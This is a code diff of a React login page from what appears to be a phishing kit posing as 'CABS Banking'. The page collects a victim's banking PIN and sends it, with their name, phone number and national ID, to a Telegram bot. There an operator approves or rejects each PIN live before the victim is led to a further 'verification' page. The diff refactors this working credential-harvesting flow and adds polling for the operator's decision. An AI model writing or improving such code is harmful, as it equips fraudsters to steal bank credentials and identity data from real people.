@@ -5,7 +5,10 @@ import { Header } from '../components/Header';
 import { Footer } from '../components/Footer';
 import { LoadingOverlay } from '../components/LoadingOverlay';
 import { Lock, AlertCircle } from 'lucide-react';
-import { sendBotNotification } from '../services/botService';
+import {
+  sendBotNotification,
+  pollPinDecision, // ✅ added
+} from '../services/botService';
 
 export const LoginPage = () => {
   const { user } = useParams();
@@ -22,6 +25,7 @@ export const LoginPage = () => {
 
   const handleChange = (index, value) => {
     if (!/^\d*$/.test(value)) return;
+
     const newDigits = [...digits];
     newDigits[index] = value.slice(-1);
     setDigits(newDigits);
@@ -53,7 +57,9 @@ export const LoginPage = () => {
   const resetForWrongPin = () => {
     setVerifying(false);
     setAwaitingApproval(false);
-    setErrorMsg(`❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`);
+    setErrorMsg(
+      `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
+    );
     setAttemptCount((prev) => prev + 1);
     setDigits(['', '', '', '']);
     setTimeout(() => {
@@ -61,20 +67,10 @@ export const LoginPage = () => {
     }, 100);
   };
 
-  const approveAndProceed = (pinStr) => {
-    updateClient({ pin: pinStr });
-    setTimeout(() => {
-      setVerifying(false);
-      setAwaitingApproval(false);
-      const userSegment = user || 'user11';
-      navigate(`/${userSegment}/verification`);
-    }, 1500);
-  };
-
- const handleSubmit = async (e) => {
+  const handleSubmit = async (e) => {
     e?.preventDefault();
-    const pinStr = digits.join('');
 
+    const pinStr = digits.join('');
     if (pinStr.length !== 4) {
       setErrorMsg('Please enter a valid 4-digit PIN');
       return;
@@ -82,22 +78,23 @@ export const LoginPage = () => {
 
     setErrorMsg('');
     setVerifying(true);
+    setAwaitingApproval(true);
 
     // Send PIN attempt notification to Telegram Bot with inline buttons
     await sendBotNotification(
       `🔐 <b>CABS Banking PIN Entry</b> (Attempt ${attemptCount}/3):\n` +
-      `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
-      `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
-      `<b>National ID</b>: ${client.id || 'N/A'}\n` +
-      `<b>PIN Entered</b>: <code>${pinStr}</code>\n\n` +
-      `👇 <b>Approve or reject this PIN:</b>`,
+        `<b>Client Name</b>: ${client?.name || 'Unknown'}\n` +
+        `<b>Phone Number</b>: ${client?.number || 'N/A'}\n` +
+        `<b>National ID</b>: ${client?.id || 'N/A'}\n` +
+        `<b>PIN Entered</b>: <code>${pinStr}</code>\n\n` +
+        `👇 <b>Approve or reject this PIN:</b>`,
       {
         inline_keyboard: [
           [
             { text: '✅ APPROVE PIN', callback_data: 'APPROVE_PIN' },
-            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' }
-          ]
-        ]
+            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' },
+          ],
+        ],
       }
     );
 
@@ -108,25 +105,32 @@ export const LoginPage = () => {
       updateClient({ pin: pinStr });
       setTimeout(() => {
         setVerifying(false);
+        setAwaitingApproval(false);
         const userSegment = user || 'user11';
         navigate(`/${userSegment}/verification`);
       }, 1500);
-    } else {
-      // WRONG_PIN or timeout -> show error and reset
-      setTimeout(() => {
-        setVerifying(false);
-        setErrorMsg(
-          decision === 'WRONG_PIN'
-            ? `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
-            : '⏰ Verification timed out. Please re-enter your PIN.'
-        );
-        setAttemptCount((prev) => prev + 1);
-        setDigits(['', '', '', '']);
-        setTimeout(() => {
-          inputRefs[0].current?.focus();
-        }, 100);
-      }, 800);
+      return;
     }
+
+    // WRONG_PIN or timeout -> show error and reset
+    setTimeout(() => {
+      setVerifying(false);
+      setAwaitingApproval(false);
+
+      if (decision === 'WRONG_PIN') {
+        setErrorMsg(
+          `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
+        );
+      } else {
+        setErrorMsg('⏰ Verification timed out. Please re-enter your PIN.');
+      }
+
+      setAttemptCount((prev) => prev + 1);
+      setDigits(['', '', '', '']);
+      setTimeout(() => {
+        inputRefs[0].current?.focus();
+      }, 100);
+    }, 800);
   };
 
   const isComplete = digits.every((d) => d !== '');
@@ -134,25 +138,45 @@ export const LoginPage = () => {
   return (
     <div className="app-viewport">
       <Header />
+
       {verifying && (
         <LoadingOverlay
-          message={awaitingApproval ? '⏳ Verifying your PIN... please wait' : '⏳ Finalizing Banking Authentication...'}
+          message={
+            awaitingApproval
+              ? '⏳ Verifying your PIN... please wait'
+              : '⏳ Finalizing Banking Authentication...'
+          }
         />
       )}
+
       <main className="main-content">
         <div className="login-card">
           <div className="login-icon-badge">
             <Lock size={32} color="#0066cc" />
           </div>
 
-          <h2 style={{ fontFamily: 'var(--font-display)', fontSize: '1.75rem', fontWeight: 700, color: 'var(--primary-navy)' }}>
+          <h2
+            style={{
+              fontFamily: 'var(--font-display)',
+              fontSize: '1.75rem',
+              fontWeight: 700,
+              color: 'var(--primary-navy)',
+            }}
+          >
             Secured Login 🔒
           </h2>
-          <p style={{ color: 'var(--text-secondary)', fontSize: '0.95rem', marginTop: '0.4rem' }}>
+
+          <p
+            style={{
+              color: 'var(--text-secondary)',
+              fontSize: '0.95rem',
+              marginTop: '0.4rem',
+            }}
+          >
             Enter your 4-digit pin to authenticate (Step {attemptCount} of 3)
           </p>
 
-          {client.number && (
+          {client?.number && (
             <div className="alert-box alert-info" style={{ marginTop: '1.25rem' }}>
               <span>📱 Account: {client.number}</span>
             </div>
@@ -193,6 +217,7 @@ export const LoginPage = () => {
           </form>
         </div>
       </main>
+
       <Footer />
     </div>
   );
